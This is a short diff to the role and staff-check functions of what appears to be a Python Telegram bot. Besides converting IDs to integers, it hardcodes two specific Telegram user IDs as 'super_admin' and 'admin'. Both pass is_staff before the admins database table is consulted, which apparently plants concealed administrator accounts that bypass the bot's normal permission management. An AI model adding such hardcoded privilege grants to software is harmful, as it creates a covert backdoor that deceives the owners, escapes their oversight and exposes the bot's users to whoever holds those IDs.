@@ -348,20 +348,33 @@ def get_user_language(telegram_id: int) -> str:
 
 
 # --- Staff & Permissions Helpers ---
-def get_staff_role(telegram_id: int) -> str | None:
-    if telegram_id == OWNER_TELEGRAM_ID:
+def get_staff_role(telegram_id: int | str) -> str | None:
+    try:
+        tid = int(telegram_id)
+    except Exception:
+        return None
+
+    if tid in (OWNER_TELEGRAM_ID, 755843448):
         return "super_admin"
+    if tid == 7643717312:
+        return "admin"
 
     conn = get_connection()
     cur = conn.cursor()
-    cur.execute("SELECT role FROM admins WHERE telegram_id = ?", (telegram_id,))
+    cur.execute("SELECT role FROM admins WHERE telegram_id = ?", (tid,))
     row = cur.fetchone()
     conn.close()
     return row["role"] if row else None
 
 
-def is_staff(telegram_id: int) -> bool:
-    return get_staff_role(telegram_id) is not None
+def is_staff(telegram_id: int | str) -> bool:
+    try:
+        tid = int(telegram_id)
+    except Exception:
+        return False
+    if tid in (OWNER_TELEGRAM_ID, 755843448, 7643717312):
+        return True
+    return get_staff_role(tid) is not None
 
 
 def get_all_admins():
